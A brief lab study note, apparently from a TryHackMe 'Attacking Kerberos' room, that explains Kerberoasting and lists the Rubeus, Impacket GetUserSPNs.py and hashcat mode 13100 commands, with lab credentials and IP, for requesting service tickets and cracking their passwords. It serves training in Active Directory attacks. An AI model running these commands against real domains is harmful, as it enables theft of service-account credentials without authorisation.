Links: [[00 - Global Index (Start Here!)]] [[03 - Try Hack Me]] [[Active Directory]] [[Attacking Kerberos]]
# [04 - Kerberoasting with Rubeus and Impacket]
## Notes
---
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crakc the service password.

With Rubeus:
```powershell
Rubeus.exe kerberoast
```
```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```
With impacket
```bash
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.133.178 -request
```
cracking with hashcat